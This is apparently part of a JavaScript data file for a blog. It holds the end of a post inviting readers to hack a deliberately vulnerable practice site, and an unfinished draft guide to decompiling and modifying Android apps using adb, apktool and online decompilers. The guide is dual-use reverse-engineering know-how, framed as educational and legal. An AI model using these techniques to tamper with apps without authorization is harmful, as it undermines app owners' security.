<h4>The vulnerabilities</h4>The security vulnerabilities are the typical ones that <a href="http://blog.roysolberg.com/tag/security-monday">I have found and presented on my blog</a>. I you have read some of those posts you might have some clues on what it could be.

It's isn't a very hard task to break in. But that is actually part of the point. There are some many weaknesses with so many web apps today. With some knowledge and open eyes you can get far. If you are able to hit gold all the way you can solve it within some minutes, but most people seem to need more time.

<h4>Happy hacking!</h4>I hope you enjoy this small assignment! Don't hesitate to give me feedback or if you have any ideas for improvements or other cool stuff that should be included. :-)

<a href="https://ra.gl/?utm_source=blog&utm_medium=article&utm_campaign=hack-my-site">Start hacking!</a>
`,
                "images": ["/images/ra.gl.png"],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                }
            },
            {
                "title": "Guide: How to crack Android apps",
                "published": false,
                "publishDate": "2018-02-28T22:10:00.000Z",
                "summary": "Learn how to reverse engineer Android apps, alter them, and put them back together.",
                "niceUrl": "/2018/02/crack-android-apps",
                "text": `<h4>tl;dr</h4>This tutorial for how to crack Android apps is one of my more technical posts. If you aren't a developer you might want to skip this one. :) I'm assuming some basic knowledge of UN*X, Android and Java.

<h4>Why crack an app?</h4>Sometimes I like to check if online services I use really are secure. <a href="/category/security">I've shown quite a few cases to prove that they very often are not.</a> Mostly I can use very simple techniques to check the security as there are so many basic security vulnerabilities out there. When it comes to apps I often use a HTTP proxy like <a href="https://www.charlesproxy.com/">Charles</a> to take a look at the HTTP and HTTPS traffic. However, <b>once in a while there are apps that use e.g. <a href="https://en.wikipedia.org/wiki/HTTP_tunnel">HTTP tunneling</a> or <a href="https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning">certificate pinning</a>. In those cases you need to go one step further to be able to listen to the network traffic.</b>

Other reasons to decompile apps could be to recover lost source code, to inject language translations or even fix a bug. But hey, remember, don't do anything you are not allowed to. Don't break the law. This guide is just for educational purposes when you have legal reasons to do what you do.

<h4>Contents</h4>These are the topics that I'll cover. You may skip the ones that are marked as optional.

- Online alternatives
- Setting up an environment (optional)
- Getting the tools
- My painful start (optional)
- Getting the APK
- Decompiling the app
- Making sense of the source code
- Changing the app
- Repackaging and replacing the app

<h4>Online alternatives</h4><b>Very often you don't have to get your hands too dirty getting the hands of a decompiled app. There are some good services out there that can provide you with most Android APKs.</b>

<h5>Online APK archives</h5>To get hold of an APK you can typically just google the package name. There's quite a few sites where to download them from. Some are more frequently updated and others. Note that you can get hold of different versions and the APK for different architectual platforms.

A word of wisdom: Don't download and run some random APK out there (at least do it in a sandboxed and/or emulated environment). There's quite a few sites that serves fake APKs or APKs that is some sort of downloader for the original one. The app might look allright, but still have some malware injected. Don't blindly trust the ones that I recommend either. If the APK is signed with the same key as an APK that you got from Play Store you should be able to trust its origin (though there have been cases of private keys in the wild (even repackaged APK uploaded to the vendor's own web site)).

 - <a href="https://apkmirror.com">APKMirror</a>
 - <a href="https://apkpure.com/">APKPure</a>
 - <a href="https://www.apkmonk.com/">APKMonk</a>

<h5>Online decompiler</h5>The quickest and easiest way to decompile an APK is to just use an online service. You just upload the APK and get an archive with all the resource and decompiled files. <a href="http://www.javadecompilers.com/apk">javadecompilers.com</a> is the one I have used, and I have been pretty happy with it.

As you might know, the <a href="https://en.wikipedia.org/wiki/Android_application_package">APK file is really just a ZIP file</a>, so you can typically just rename it to <span class="code">.zip</span> and double click it or run <span class="code">unzip</span> and you can start investigating the app. If it's a <a href="https://en.wikipedia.org/wiki/Web_application#Definition_and_similar_terms">hybrid app</a> you might not have to decompile it at all to get access to everything.

<h4>Setting up an environment</h4><h6>(optional)</h6>You don't need to set up your own environment to do some cracking of a few APKs. However, if you either don't fully trust the tools or don't want to clutter up your computer with the Android SDK etc. it can be nice to run everything in a separate computer or virtual machine.

You really want a 64-bit environment or else you might end up hitting too many hurdles. Working with security in general it can be nice to use a distro like <a href="https://www.kali.org/">Kali Linux</a>. There are <a href="https://www.kali.org/downloads/">complete images</a> that you can download and either run on a USB stick, do a full normal install, or using a virtual machine for e.g. <a href="https://www.vmware.com/">VMware</a>, <a href="https://www.virtualbox.org/">VirtualBox</a> or <a href="http://www.microsoft.com/hyper-v">Hyper-V</a>. Personally I mostly use VirtualBox when using a virtual environment.

<h4>Getting the tools</h4><h5>Android - SDK, tools and emulators</h5>You need to have at least the Android tools and SDK, but for most people I would recommend <a href="https://developer.android.com/studio/index.html">to just install Android Studio</a> and follow the instructions to set it up as normal (but skip stuff like the SDK for Android TV and other stuff that will slow down your download).

<h5>Apktool - disassembling and reassembling APKs</h5><a href="https://ibotpeaches.github.io/Apktool/install/">Apktool can be installed manually</a>, or if its available via your package manager you can just install it using the command <span class="code">apt-get install apktool</span>.

<h5>Getting the APK</h5>The first step of the reverse engeineering is to get hold of the APK. I'll use my own Android app <a href="https://play.google.com/store/apps/details?id=com.roysolberg.android.developertools">Developer Tools</a> as an example app. It's open source and if you want you <a href="https://github.com/roys/java-android-developertools">get the source code and APKs from GitHub</a>.

The command-line tool <a href="https://developer.android.com/studio/command-line/adb.html">adb (Android Debug Bridge)</a> is used for all communication with the device or emulator. You can find the tool in the Android's installation folder <span class="code">Android/Sdk/platform-tools</span>.

<pre class="prettyprint lang-bsh">&gt; # Lists all packages:
&gt; adb shell pm list packages
&lt;loong list of apps /&gt;

&gt; # Simple way of searching for packages:
&gt; adb shell pm list packages |grep roysolberg
package:com.roysolberg.android.smarthome
package:com.roysolberg.android.datacounter
package:com.roysolberg.android.developertools

&gt; # Get the path of a package:
&gt; adb shell pm path com.roysolberg.android.developertools
package:/data/app/com.roysolberg.android.developertools-1/base.apk

&gt; # Get hold of the APK actual APK file:
&gt; adb pull /data/app/com.roysolberg.android.developertools-1/base.apk
/data/app/com.roysolberg.android.developertools-...file pulled. 25.2 MB/s (2035934 bytes in 0.077s)</pre>


TODO: Continue here
`,
                "images": [],
                "category":
                {
                    "title": "Software development",
                    "url": "/software-development"
                }
            }
        ];
}(window.SpaBlog));
